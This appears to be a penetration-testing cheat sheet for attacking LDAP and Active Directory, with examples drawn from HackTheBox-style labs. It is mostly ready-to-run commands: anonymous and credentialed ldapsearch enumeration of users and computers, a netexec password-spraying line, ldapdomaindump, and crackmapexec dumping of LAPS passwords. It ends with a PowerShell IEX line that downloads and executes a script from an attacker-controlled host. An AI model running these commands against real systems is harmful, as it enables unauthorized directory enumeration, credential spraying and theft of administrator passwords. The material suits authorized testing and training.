---
id: ldap
title: LDAP - 389,636,3268,3269
---

### ldapsearch
https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html#ldapsearch


```bash
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```

Check null credentials or if your credentials are valid:

```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>" ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
#Example
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb"
```

##### Extract **users**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
#Example
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "CN=Users,DC=vintage,DC=htb"
```

#### Extract **computers**:

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
#Example
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "CN=Computers,DC=vintage,DC=htb" 
```

### [Password Spraying Attack](https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/#password-spraying-attack)
```bash
netexec ldap sequel.htb -u users.grep -p 'MSSQLP@ssw0rd!' --no-bruteforce --continue-on-success
```

### ldapdomaindump

```bash
ldapdomaindump -u 'domain\user' -p 'pass' <IP>
```

```bash
ldapdomaindump -u 'domain\user' -p 'LM:NTML' <IP>
```

### crackmapexec

#### Dumping LDAP Passwords
```bash
crackmapexec ldap domain.domain -u user -p 'password' --kdcHost domain.domain -M laps
```

### Get-LAPSPasswords.ps1

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/Get-LAPSPasswords.ps1')
Get-LAPSPasswords
```